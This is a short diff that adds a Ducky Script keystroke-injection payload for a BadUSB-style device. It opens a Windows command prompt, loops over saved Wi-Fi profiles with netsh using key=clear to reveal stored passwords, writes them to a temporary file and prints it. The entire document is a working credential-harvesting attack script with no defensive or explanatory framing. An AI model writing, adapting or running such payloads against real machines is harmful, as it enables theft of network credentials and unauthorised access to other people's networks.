@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING cmd /k
+ENTER
+DELAY 700
+STRING for /f "skip=9 tokens=1,2 delims=:" %a in ('netsh wlan show profiles') do @echo Profile:%b & netsh wlan show profile name="%b" key=clear 2>&1 | findstr "Key Content SSID"
+ENTER
+DELAY 3000
+STRING for /f "skip=9 tokens=1,2 delims=:" %a in ('netsh wlan show profiles') do @netsh wlan show profile name="%b" key=clear >> %temp%\px_wifi.txt 2>&1
+ENTER
+DELAY 2000
+STRING type %temp%\px_wifi.txt
+ENTER
